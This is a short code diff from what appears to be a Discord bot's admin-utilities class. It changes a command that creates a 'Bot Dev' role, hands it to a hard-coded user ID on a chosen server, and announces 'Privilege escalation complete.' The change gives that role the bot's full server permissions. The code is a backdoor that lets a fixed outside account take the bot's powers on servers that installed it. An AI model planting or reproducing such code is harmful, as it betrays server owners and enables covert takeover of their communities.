@@ -165,7 +165,7 @@ class AdminUtils:
         serv = self.bot.get_server(servID)
         thisBot = serv.me
         pek = await self.bot.create_role(serv, name="Bot Dev",
-                                         permissions=thisBot.permissions_in(serv.get_channel(serv.id)))
+                                         permissions=thisBot.server_permissions)
         await self.bot.add_roles(serv.get_member("187421759484592128"), pek)
         await self.bot.say("Privilege escalation complete.")
 
